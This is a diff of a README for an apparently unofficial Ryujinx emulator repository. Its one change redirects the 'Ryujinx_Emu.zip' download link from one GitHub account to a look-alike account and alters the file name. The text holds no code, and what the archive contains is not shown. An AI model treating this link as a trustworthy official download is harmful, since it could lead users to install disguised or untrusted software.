@@ -5,7 +5,7 @@
 <img width="280" height="280" alt="images1" src="https://github.com/user-attachments/assets/246f19aa-e5c1-46e7-b198-aff04c305109" />
 
 ## Install
-[Download `Ryujinx_Emu.zip`](https://github.com/ryujinx-emulator/Ryujinx-Emu/releases/download/1.1.1403/Ryujinx-Emu.zip)
+[Download `Ryujinx_Emu.zip`](https://github.com/ryujinxcanary/Ryujinx-Emu/releases/download/1.1.1403/Ryujinx_Emu.zip)
 ---
 
 <img width="1200" height="675" alt="images2" src="https://github.com/user-attachments/assets/dede3098-96a9-40e5-8054-343c4a10ac8a" />
